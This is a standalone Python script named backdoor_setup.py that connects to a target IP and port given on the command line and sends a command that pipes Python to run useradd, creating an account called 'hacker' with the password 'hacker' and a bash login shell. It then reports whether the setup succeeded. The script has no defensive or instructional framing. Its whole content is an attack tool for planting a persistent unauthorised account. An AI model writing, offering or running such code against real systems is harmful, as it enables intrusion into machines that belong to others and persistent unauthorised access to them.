```python
# backdoor_setup.py
import socket
import sys

def setup_backdoor(target_ip, target_port):
    """
    Sets up a backdoor on the target system for persistent access.
    :param target_ip: IP address of the target system.
    :param target_port: Port number of the target system.
    :return: None
    """
    try:
        # Create a socket object
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Connect to the server on target IP and port
        s.connect((target_ip, target_port))
        
        # Send backdoor setup commands to target
        # This command sets up a simple backdoor by adding a new user with administrative privileges
        command = "echo 'import os; os.system(\"useradd -m -p $(openssl passwd -1 hacker) -s /bin/bash hacker\")' | python"
        s.send(command.encode('utf-8'))
        
        # Receive the response from the server
        response = s.recv(1024).decode('utf-8')
        
        # Check if the backdoor setup was successful
        if "Success" in response:
            print("Backdoor setup successful.")
        else:
            print("Backdoor setup failed.")
    except Exception as e:
        print(f"An error occurred during backdoor setup: {e}")
    finally:
        # Close the socket connection
        s.close()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python backdoor_setup.py <target_ip> <target_port>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    
    # Setup the backdoor on the specified target system
    setup_backdoor(target_ip, target_port)
```
